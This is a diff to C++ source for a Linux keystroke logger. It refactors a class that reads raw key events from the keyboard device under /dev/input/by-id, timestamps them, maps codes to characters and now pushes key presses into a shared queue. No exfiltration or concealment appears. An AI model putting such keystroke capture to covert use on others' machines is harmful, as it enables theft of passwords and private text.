@@ -17,16 +17,17 @@
 #include <unistd.h>
 #include <utility>
 
-logger& logger::get_instance() {
-	static logger instance;
+logger& logger::get_instance(tsq& queue) {
+	static logger instance(queue);
 	return instance;
 }
 
-logger::logger()
+logger::logger(tsq& queue)
 : fd_(-1)
 , initialized_(false)
 , running_(false)
-, keymap_(load_keymap("keymap.json")) {}
+, keymap_(load_keymap("keymap.json"))
+, q_(queue) {}
 
 logger::~logger() {
 	if (fd_ != -1) {
@@ -89,9 +90,7 @@ auto logger::
 }
 
 auto fd_monitor(signed int fd, fd_set fds) -> signed int {
-	struct timeval timeout;
-	timeout.tv_sec  = 1;
-	timeout.tv_usec = 0;
+	struct timeval timeout{1, 0};
 
 	FD_ZERO(&fds);
 	FD_SET(fd, &fds);
@@ -116,16 +115,15 @@ auto datetime(time_t tv_sec) -> std::pair<std::string, std::string> {
 auto find_kbd() -> std::string {
 	auto const hardware_path = "/dev/input/by-id";
 	auto const kbd_id        = "-event-kbd";
-	auto const input_dir(hardware_path);
 
-	assert(std::filesystem::exists(input_dir) && std::filesystem::is_directory(input_dir) &&
+	assert(std::filesystem::exists(hardware_path) && std::filesystem::is_directory(hardware_path) &&
 	       "logger (find_kbd): invalid input directory.");
 
-	for (auto const& file : std::filesystem::directory_iterator(input_dir)) {
+	for (auto const& file : std::filesystem::directory_iterator(hardware_path)) {
 		if (file.is_symlink() || file.is_character_file()) {
 			auto const& path = file.path();
 			if (path.filename().string().find(kbd_id) != std::string::npos) {
-				auto                  ec = std::error_code{};
+				auto       ec            = std::error_code{};
 				auto const resolved_path = std::filesystem::canonical(path, ec);
 				assert(!ec && "logger (find_kbd): symlink resolution error.");
 
@@ -157,8 +155,11 @@ auto logger::ev_reader() -> void {
 		if (n == (ssize_t)sizeof(ev) && ev.type == EV_KEY) {
 			auto  dtg = datetime(ev.time.tv_sec);
 			event e{dtg.first, dtg.second, get_keychar(ev.code), ev.value ? true : false};
-			// TODO: send event e to tsq using dependency injection
-		}
+		    // TODO: does not handle held ctrl case, held shift case
+            if (ev.value == true) {
+                q_.push(e);
+            }
+        }
 
 		fd_set fds;
 		auto   retval = fd_monitor(fd_, fds);
